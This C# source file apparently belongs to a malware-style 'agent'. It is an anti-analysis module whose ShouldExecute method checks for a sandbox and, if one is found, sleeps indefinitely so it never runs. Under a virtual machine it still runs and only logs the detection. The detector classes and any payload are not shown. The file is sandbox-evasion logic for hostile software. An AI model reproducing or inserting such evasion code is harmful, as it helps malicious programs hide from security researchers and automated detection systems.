namespace LibraNextgen.Agent.AntiAnalysis;

public static class EnvironmentProbe
{
    public static bool ShouldExecute()
    {
        if (SandboxDetector.IsSandbox())
        {
            Console.WriteLine("[Agent] Sandbox detected. Sleeping indefinitely.");
            Thread.Sleep(Timeout.Infinite);
            return false;
        }

        if (VmDetector.IsVirtualMachine())
        {
            Console.WriteLine("[Agent] VM detected — may still execute depending on config.");
            // Allow execution in VM but log it
        }

        return true;
    }
}
